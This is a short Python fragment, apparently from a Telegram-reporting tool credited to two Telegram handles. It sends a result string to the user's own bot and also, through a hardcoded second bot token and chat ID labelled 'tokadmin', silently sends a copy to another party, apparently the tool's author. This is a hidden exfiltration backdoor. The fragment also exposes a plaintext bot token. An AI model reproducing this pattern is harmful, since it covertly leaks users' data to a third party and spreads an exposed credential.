...
@k6_vk  -  @tt_beno_8
					...
					cp+=1
					id="5539618337"
					tokadmin="6092187509:AAFHv6S4JdmBwvvPyZm2mhfdVESJLZxzEhk"
     
					requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
					requests.get('https://api.telegram.org/bot' + str(tokadmin) + '/sendMessage?chat_id=' + str(id) + '&text=' + str(statusok))
				break
